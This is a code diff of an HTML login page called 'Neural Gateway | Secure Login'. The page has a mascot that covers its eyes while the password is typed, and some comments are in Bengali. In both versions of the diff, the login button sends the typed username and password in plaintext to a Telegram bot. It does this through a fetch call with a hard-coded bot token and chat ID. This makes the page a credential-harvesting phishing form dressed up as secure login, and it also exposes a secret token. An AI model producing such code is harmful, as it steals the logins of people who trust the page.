@@ -2,66 +2,51 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Neural Gateway - Advanced Login</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.9.1/gsap.min.js"></script>
+    <title>Neural Gateway | Secure Login</title>
     <style>
-        body { margin: 0; background: #000; color: #00ff88; font-family: 'Courier New', monospace; overflow: hidden; }
-        canvas { position: fixed; top: 0; left: 0; z-index: -1; }
-        #ui { display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .card { background: rgba(0,20,10,0.8); backdrop-filter: blur(10px); padding: 30px; border: 1px solid #00ff88; border-radius: 20px; width: 300px; text-align: center; }
-        input { width: 90%; padding: 10px; margin: 10px 0; background: #000; border: 1px solid #00ff88; color: #fff; }
-        button { background: #00ff88; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
-        #mascot { margin-bottom: 20px; font-size: 50px; } /* Ekhane apnar SVG bosabe */
+        body { margin: 0; background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .glass-card { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.1); padding: 40px; border-radius: 30px; text-align: center; width: 350px; }
+        #mascot-img { width: 180px; height: 180px; margin-bottom: 20px; transition: 0.3s; }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: rgba(0,0,0,0.3); border: 1px solid #444; color: white; border-radius: 10px; outline: none; }
+        button { width: 100%; padding: 15px; margin-top: 10px; background: #00ff88; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
 
-<canvas id="bg"></canvas>
-
-<div id="ui">
-    <div class="card">
-        <div id="mascot">🤖</div>
-        <h2>NEURAL LOGIN</h2>
+<div class="glass-card">
+    <img id="mascot-img" src="1000022715.jpg" alt="Mascot">
+    
+    <div id="login-form">
         <input type="text" id="username" placeholder="Username">
         <input type="password" id="password" placeholder="Password">
-        <button onclick="login()">SECURE ACCESS</button>
+        <button onclick="sendData()">SECURE LOGIN</button>
     </div>
 </div>
 
 <script>
-    // Three.js Background
-    const scene = new THREE.Scene();
-    const camera = new THREE.PerspectiveCamera(75, window.innerWidth/window.innerHeight, 0.1, 1000);
-    const renderer = new THREE.WebGLRenderer({ canvas: document.querySelector('#bg') });
-    renderer.setSize(window.innerWidth, window.innerHeight);
-    
-    // Telegram Integration
-    function login() {
+    const img = document.getElementById('mascot-img');
+    const pass = document.getElementById('password');
+
+    // পোজ পরিবর্তন লজিক
+    pass.addEventListener('focus', () => img.src = '1000022716.jpg'); // চোখ ঢাকা
+    pass.addEventListener('blur', () => img.src = '1000022715.jpg');  // সাধারণ অবস্থা
+
+    // পাসওয়ার্ড টাইপ করলে আঙুল ফাঁক করে দেখা (peeking)
+    pass.addEventListener('input', () => {
+        if(pass.value.length > 0) img.src = '1000022717.jpg';
+    });
+
+    // টেলিগ্রাম বট ফাংশন
+    function sendData() {
         const user = document.getElementById('username').value;
-        const pass = document.getElementById('password').value;
+        const passVal = pass.value;
         const token = "8736432847:AAHbDf-tOzpa6q--_R-1MRGeENKkh9CEHWc";
         const chatId = "7950771882";
         
-        const text = `New Login Attempt:%0AUser: ${user}%0APass: ${pass}`;
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}`)
-        .then(() => alert("Access request sent to Neural Core!"));
+        const msg = `New Login!%0AUser: ${user}%0APass: ${passVal}`;
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${msg}`)
+        .then(() => alert("Login request initialized!"));
     }
-
-    // Animation loop
-    function animate() {
-        requestAnimationFrame(animate);
-        renderer.render(scene, camera);
-    }
-    animate();
-
-    // Password Peek Logic
-    document.getElementById('password').addEventListener('focus', () => {
-        document.getElementById('mascot').innerText = '🙈';
-    });
-    document.getElementById('password').addEventListener('blur', () => {
-        document.getElementById('mascot').innerText = '🤖';
-    });
 </script>
 
 </body>
